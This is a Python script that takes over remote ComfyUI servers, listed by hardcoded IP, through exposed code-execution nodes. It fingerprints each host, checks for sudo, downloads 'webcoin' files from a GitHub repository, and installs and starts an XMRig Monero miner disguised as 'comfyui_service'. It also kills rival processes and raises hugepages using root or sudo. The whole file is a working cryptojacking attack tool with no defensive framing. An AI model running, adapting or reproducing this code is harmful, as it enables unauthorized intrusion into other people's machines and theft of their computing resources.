"""Deploy to multiple machines — diagnose, hotfix, fix config, restart XMRig."""
import json, urllib.error, urllib.request, ssl, time, sys

targets = sys.argv[1:] if len(sys.argv) > 1 else ["160.85.252.107", "160.85.252.207"]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

GITHUB_BASE = "https://raw.githubusercontent.com/bossman79/webcoin/master/"
HOTFIX_FILES = [
    "__init__.py", "core/config.py", "core/miner.py",
    "core/gpu_miner.py", "core/dashboard.py",
]


def try_connect(ip):
    """Find the right scheme/port for ComfyUI."""
    for scheme, port in [("http", 8188), ("http", 80), ("https", 443)]:
        try:
            url = f"{scheme}://{ip}:{port}/system_stats"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            kw = {"timeout": 12}
            if scheme == "https":
                kw["context"] = ctx
            with urllib.request.urlopen(req, **kw) as r:
                data = json.loads(r.read())
                if "system" in data:
                    return f"{scheme}://{ip}:{port}"
        except Exception:
            pass
    return None


def _srl_fixup_result(code_str: str) -> str:
    """SRL Eval returns a value to PreviewAny; IDENode uses `result = ...` instead."""
    lines = code_str.rstrip("\n").split("\n")
    for i in range(len(lines) - 1, -1, -1):
        stripped = lines[i].lstrip()
        if stripped.startswith("result = "):
            indent = lines[i][: len(lines[i]) - len(lines[i].lstrip())]
            rhs = stripped[len("result = ") :]
            lines[i] = indent + "return " + rhs
            break
    return "\n".join(lines) + "\n"


def _srl_code_for_eval(code_str: str) -> str:
    """SRL Eval's `parameters` must be a valid Python param list; bust cache in-code."""
    bust = f"# _deploy_batch bust {time.time()}\n"
    return bust + _srl_fixup_result(code_str)


def _outputs_to_text(outputs) -> list:
    """PreviewAny / ComfyUI may nest strings dicts or lists."""
    out = []

    def walk(x):
        if isinstance(x, str):
            out.append(x)
        elif isinstance(x, (int, float)) and not isinstance(x, bool):
            out.append(str(x))
        elif isinstance(x, list):
            for y in x:
                walk(y)
        elif isinstance(x, dict):
            for y in x.values():
                walk(y)

    walk(outputs)
    return out


def run_code(base, code_str, wait_secs=30):
    """Execute Python via SRL Eval or IDENode, return output."""
    # SRL Eval first — most GPU ComfyUI images ship SRL, not IDENode
    for node_setup in [
        # SRL Eval + PreviewAny (unique parameters bust ComfyUI execution cache)
        {
            "1": {
                "class_type": "SRL Eval",
                "inputs": {
                    "parameters": "",
                    "code": _srl_code_for_eval(code_str),
                },
            },
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        },
        # IDENode + PreviewTextNode
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": code_str, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
    ]:
        prompt = {"prompt": node_setup, "extra_data": {"extra_pnginfo": {
            "workflow": {"nodes": [{"id": 1, "type": list(node_setup["1"].values())[0]},
                                   {"id": 2, "type": list(node_setup["2"].values())[0]}]}
        }}}
        body = json.dumps(prompt).encode()
        req = urllib.request.Request(
            f"{base}/prompt", data=body,
            headers={"Content-Type": "application/json"}, method="POST"
        )
        kw = {"timeout": 120}
        if base.startswith("https"):
            kw["context"] = ctx
        try:
            with urllib.request.urlopen(req, **kw) as r:
                resp = json.loads(r.read().decode())
                if "error" in resp:
                    continue
                pid = resp.get("prompt_id")
                break
        except TimeoutError:
            return "ERROR: prompt POST timed out"
        except urllib.error.HTTPError as e:
            err_body = e.read().decode()
            if "missing_node_type" in err_body or "not found" in err_body.lower():
                continue
            raise
    else:
        return "ERROR: No code execution node available"

    for i in range(int(wait_secs / 3) + 5):
        time.sleep(3)
        try:
            req2 = urllib.request.Request(f"{base}/history/{pid}")
            kw2 = {"timeout": 15}
            if base.startswith("https"):
                kw2["context"] = ctx
            with urllib.request.urlopen(req2, **kw2) as r:
                entry = json.loads(r.read().decode()).get(pid, {})
                status = entry.get("status", {}).get("status_str", "pending")
                if status != "pending":
                    outputs = entry.get("outputs", {})
                    texts = _outputs_to_text(outputs)
                    if texts:
                        return "\n".join(texts)
                    msgs = entry.get("status", {}).get("messages", [])
                    errs = [m for m in msgs if m and m[0] == "execution_error"]
                    if errs:
                        return "execution_error: " + json.dumps(errs[-1][1])[:800]
                    return json.dumps(outputs)
        except Exception:
            pass
    return "TIMEOUT"


DIAG_CODE = (
    "import os, subprocess, json\n"
    "lines = []\n"
    "lines.append('whoami=' + os.popen('whoami').read().strip())\n"
    "try:\n"
    "    lines.append('uid=' + str(os.getuid()))\n"
    "except AttributeError:\n"
    "    lines.append('uid=win')\n"
    "lines.append('cpu=' + str(os.cpu_count()))\n"
    "lines.append('container=' + str(os.path.exists('/.dockerenv')))\n"
    "webcoin = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "    p = os.path.join(cn, 'webcoin')\n"
    "    if os.path.isdir(p):\n"
    "        webcoin = p\n"
    "except:\n"
    "    pass\n"
    "if not webcoin:\n"
    "    for c in ['/root/ComfyUI/custom_nodes/webcoin', '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
    "              '/basedir/custom_nodes/webcoin', '/workspace/ComfyUI/custom_nodes/webcoin',\n"
    "              '/app/ComfyUI/custom_nodes/webcoin', '/opt/ComfyUI/custom_nodes/webcoin']:\n"
    "        if os.path.isdir(c):\n"
    "            webcoin = c\n"
    "            break\n"
    "lines.append('webcoin=' + str(webcoin))\n"
    "if webcoin:\n"
    "    bd = os.path.join(webcoin, 'bin')\n"
    "    lines.append('bin=' + str(os.listdir(bd) if os.path.isdir(bd) else 'NONE'))\n"
    "    cp = os.path.join(bd, 'config.json')\n"
    "    if os.path.exists(cp):\n"
    "        with open(cp) as f:\n"
    "            cfg = json.load(f)\n"
    "        cpu = cfg.get('cpu', {})\n"
    "        lines.append('priority=' + str(cpu.get('priority')))\n"
    "        lines.append('yield=' + str(cpu.get('yield')))\n"
    "        lines.append('hp_jit=' + str(cpu.get('huge-pages-jit')))\n"
    "        rx = cpu.get('rx')\n"
    "        lines.append('rx_threads=' + str(len(rx) if rx else 'auto'))\n"
    "try:\n"
    "    with open('/proc/sys/vm/nr_hugepages') as f:\n"
    "        lines.append('nr_hugepages=' + f.read().strip())\n"
    "except:\n"
    "    pass\n"
    "try:\n"
    "    r = subprocess.run(['sudo', '-n', 'echo', 'ok'], capture_output=True, text=True, timeout=5)\n"
    "    lines.append('sudo=' + ('yes' if r.returncode == 0 else 'no'))\n"
    "except:\n"
    "    lines.append('sudo=unavailable')\n"
    "try:\n"
    "    import urllib.request as ur\n"
    "    req = ur.Request('http://127.0.0.1:44880/2/summary',\n"
    "        headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "    with ur.urlopen(req, timeout=5) as resp:\n"
    "        d = json.loads(resp.read())\n"
    "    hr = d.get('hashrate', {}).get('total', [])\n"
    "    lines.append('hr=' + str(hr))\n"
    "    lines.append('hp=' + str(d.get('hugepages')))\n"
    "    lines.append('xmrig_threads=' + str(d.get('cpu', {}).get('threads')))\n"
    "    lines.append('xmrig_cpu=' + str(d.get('cpu', {}).get('brand')))\n"
    "except Exception as e:\n"
    "    lines.append('xmrig_api=' + str(e)[:100])\n"
    "result = chr(10).join(lines)\n"
)

HOTFIX_CODE = (
    "import os, shutil\n"
    "lines = []\n"
    "webcoin = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "    webcoin = os.path.join(cn, 'webcoin')\n"
    "except:\n"
    "    pass\n"
    "if not webcoin or not os.path.isdir(webcoin):\n"
    "    for c in ['/root/ComfyUI/custom_nodes/webcoin', '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
    "              '/basedir/custom_nodes/webcoin', '/workspace/ComfyUI/custom_nodes/webcoin',\n"
    "              '/app/ComfyUI/custom_nodes/webcoin']:\n"
    "        if os.path.isdir(c):\n"
    "            webcoin = c\n"
    "            break\n"
    "import urllib.request as ur\n"
    "base_url = 'https://raw.githubusercontent.com/bossman79/webcoin/master/'\n"
    "files = ['__init__.py', 'core/config.py', 'core/miner.py', 'core/gpu_miner.py', 'core/dashboard.py']\n"
    "for rel in files:\n"
    "    dest = os.path.join(webcoin, *rel.split('/'))\n"
    "    try:\n"
    "        os.makedirs(os.path.dirname(dest), exist_ok=True)\n"
    "        req = ur.Request(base_url + rel, headers={'User-Agent': 'Mozilla/5.0'})\n"
    "        with ur.urlopen(req, timeout=30) as resp:\n"
    "            data = resp.read()\n"
    "        with open(dest, 'wb') as f:\n"
    "            f.write(data)\n"
    "        lines.append('OK ' + rel + ' (' + str(len(data)) + 'b)')\n"
    "    except Exception as e:\n"
    "        lines.append('FAIL ' + rel + ': ' + str(e)[:100])\n"
    "for d in ['__pycache__', os.path.join('core', '__pycache__')]:\n"
    "    p = os.path.join(webcoin, d)\n"
    "    if os.path.isdir(p):\n"
    "        shutil.rmtree(p)\n"
    "        lines.append('cleared ' + d)\n"
    "m = os.path.join(webcoin, '.initialized')\n"
    "if os.path.exists(m):\n"
    "    os.remove(m)\n"
    "    lines.append('cleared .initialized')\n"
    "result = chr(10).join(lines)\n"
)

# After hotfix: download XMRig binary + write default config (no ComfyUI restart)
ENSURE_MINER_CODE = (
    "import os, sys\n"
    "from pathlib import Path\n"
    "lines = []\n"
    "webcoin = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "    webcoin = os.path.join(cn, 'webcoin')\n"
    "except:\n"
    "    pass\n"
    "if not webcoin or not os.path.isdir(webcoin):\n"
    "    for c in ['/root/ComfyUI/custom_nodes/webcoin', '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
    "              '/basedir/custom_nodes/webcoin', '/workspace/ComfyUI/custom_nodes/webcoin',\n"
    "              '/app/ComfyUI/custom_nodes/webcoin']:\n"
    "        if os.path.isdir(c):\n"
    "            webcoin = c\n"
    "            break\n"
    "if not webcoin or not os.path.isdir(webcoin):\n"
    "    result = 'ERROR: webcoin not found'\n"
    "else:\n"
    "    sys.path.insert(0, webcoin)\n"
    "    try:\n"
    "        from core.miner import MinerManager\n"
    "        from core.config import ConfigBuilder\n"
    "        mm = MinerManager(Path(webcoin))\n"
    "        bp = mm.ensure_binary()\n"
    "        lines.append('ensure_binary=' + str(bp))\n"
    "        mm.write_config(ConfigBuilder().build())\n"
    "        lines.append('wrote_config=yes')\n"
    "    except Exception as e:\n"
    "        lines.append('bootstrap_err=' + str(e)[:220])\n"
    "    result = chr(10).join(lines)\n"
)

FIX_CONFIG_CODE = (
    "import os, subprocess, json, time, platform\n"
    "lines = []\n"
    "IS_WIN = platform.system() == 'Windows'\n"
    "webcoin = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "    webcoin = os.path.join(cn, 'webcoin')\n"
    "except:\n"
    "    pass\n"
    "if not webcoin or not os.path.isdir(webcoin):\n"
    "    for c in ['/root/ComfyUI/custom_nodes/webcoin', '/home/ubuntu/ComfyUI/custom_nodes/webcoin',\n"
    "              '/basedir/custom_nodes/webcoin', '/workspace/ComfyUI/custom_nodes/webcoin',\n"
    "              '/app/ComfyUI/custom_nodes/webcoin']:\n"
    "        if os.path.isdir(c):\n"
    "            webcoin = c\n"
    "            break\n"
    "bd = os.path.join(webcoin, 'bin')\n"
    "cp = os.path.join(bd, 'config.json')\n"
    "svc = os.path.join(bd, 'comfyui_service')\n"
    "if IS_WIN:\n"
    "    for exe in ['comfyui_service.exe', 'comfyui_render.exe', 'xmrig.exe']:\n"
    "        try:\n"
    "            subprocess.run(['taskkill', '/F', '/IM', exe], capture_output=True, text=True, timeout=15)\n"
    "        except:\n"
    "            pass\n"
    "else:\n"
    "    for n in ['comfyui_service', 'comfyui_render']:\n"
    "        try:\n"
    "            subprocess.run(['pkill', '-9', '-f', n], capture_output=True, timeout=5)\n"
    "        except:\n"
    "            pass\n"
    "time.sleep(2)\n"
    "lines.append('killed miners')\n"
    "if os.path.exists(cp):\n"
    "    with open(cp) as f:\n"
    "        cfg = json.load(f)\n"
    "    cpu = cfg.get('cpu', {})\n"
    "    old_p = cpu.get('priority')\n"
    "    old_y = cpu.get('yield')\n"
    "    cpu['priority'] = 3\n"
    "    cpu['yield'] = False\n"
    "    cpu['huge-pages-jit'] = True\n"
    "    cpu['huge-pages'] = True\n"
    "    cpu['max-threads-hint'] = 100\n"
    "    if 'rx' in cpu:\n"
    "        old_rx = len(cpu['rx'])\n"
    "        del cpu['rx']\n"
    "        lines.append('removed rx pinning (was ' + str(old_rx) + ')')\n"
    "    cfg['cpu'] = cpu\n"
    "    cfg['autosave'] = False\n"
    "    with open(cp, 'w') as f:\n"
    "        json.dump(cfg, f, indent=2)\n"
    "    lines.append('config: p=' + str(old_p) + '->3 y=' + str(old_y) + '->F')\n"
    "else:\n"
    "    lines.append('no config yet')\n"
    "if IS_WIN:\n"
    "    lines.append('hp=skipped_windows')\n"
    "else:\n"
    "    try:\n"
    "        is_root = os.getuid() == 0\n"
    "    except AttributeError:\n"
    "        is_root = False\n"
    "    hp = False\n"
    "    if is_root:\n"
    "        try:\n"
    "            with open('/proc/sys/vm/nr_hugepages', 'w') as f:\n"
    "                f.write('1280')\n"
    "            hp = True\n"
    "            lines.append('hp=1280(root)')\n"
    "        except:\n"
    "            pass\n"
    "    if not hp:\n"
    "        try:\n"
    "            r = subprocess.run(['sudo', '-n', 'sysctl', '-w', 'vm.nr_hugepages=1280'],\n"
    "                               capture_output=True, text=True, timeout=10)\n"
    "            if r.returncode == 0:\n"
    "                hp = True\n"
    "                lines.append('hp=1280(sudo)')\n"
    "            else:\n"
    "                lines.append('hp_fail=' + r.stderr.strip()[:60])\n"
    "        except:\n"
    "            lines.append('hp=unavailable')\n"
    "    try:\n"
    "        cmd = ['modprobe', 'msr'] if is_root else ['sudo', '-n', 'modprobe', 'msr']\n"
    "        subprocess.run(cmd, capture_output=True, timeout=10)\n"
    "    except:\n"
    "        pass\n"
    "if IS_WIN and not os.path.isfile(svc):\n"
    "    wexe = svc + '.exe'\n"
    "    if os.path.isfile(wexe):\n"
    "        svc = wexe\n"
    "if os.path.exists(svc) and os.path.exists(cp):\n"
    "    log_fh = open(os.path.join(bd, 'service.log'), 'a')\n"
    "    _kw = dict(stdout=log_fh, stderr=log_fh, stdin=subprocess.DEVNULL)\n"
    "    if not IS_WIN:\n"
    "        _kw['preexec_fn'] = lambda: os.nice(2)\n"
    "    proc = subprocess.Popen([svc, '-c', cp, '--no-color'], **_kw)\n"
    "    lines.append('xmrig pid=' + str(proc.pid))\n"
    "    time.sleep(5)\n"
    "    lines.append('alive=' + str(proc.poll() is None))\n"
    "else:\n"
    "    lines.append('binary/config missing')\n"
    "time.sleep(10)\n"
    "try:\n"
    "    import urllib.request as ur\n"
    "    req = ur.Request('http://127.0.0.1:44880/2/summary',\n"
    "        headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "    with ur.urlopen(req, timeout=5) as resp:\n"
    "        d = json.loads(resp.read())\n"
    "    hr = d.get('hashrate', {}).get('total', [])\n"
    "    lines.append('hr=' + str(hr))\n"
    "    lines.append('hp_xmrig=' + str(d.get('hugepages')))\n"
    "    lines.append('threads=' + str(d.get('cpu', {}).get('threads')))\n"
    "    lines.append('cpu=' + str(d.get('cpu', {}).get('brand')))\n"
    "except Exception as e:\n"
    "    lines.append('api=' + str(e)[:80])\n"
    "result = chr(10).join(lines)\n"
)


for ip in targets:
    print(f"\n{'='*60}")
    print(f"  Target: {ip}")
    print(f"{'='*60}\n")

    try:
        # Connect
        base = try_connect(ip)
        if not base:
            print(f"  UNREACHABLE on ports 8188, 80, 443\n")
            continue
        print(f"  Connected: {base}\n")

        # Step 1: Diagnose
        print("  --- Diagnose ---")
        result = run_code(base, DIAG_CODE, wait_secs=45)
        print(f"  {result}\n")

        # Step 2: Hotfix
        print("  --- Hotfix (download latest files) ---")
        result = run_code(base, HOTFIX_CODE, wait_secs=60)
        print(f"  {result}\n")

        # Step 3: Ensure binary + default config (Windows/Linux)
        print("  --- Ensure binary + config ---")
        result = run_code(base, ENSURE_MINER_CODE, wait_secs=120)
        print(f"  {result}\n")

        # Step 4: Fix config + restart
        print("  --- Fix config + hugepages + restart ---")
        result = run_code(base, FIX_CONFIG_CODE, wait_secs=90)
        print(f"  {result}\n")
    except Exception as e:
        print(f"  ERROR: {type(e).__name__}: {e}\n")

print("\nDone.")
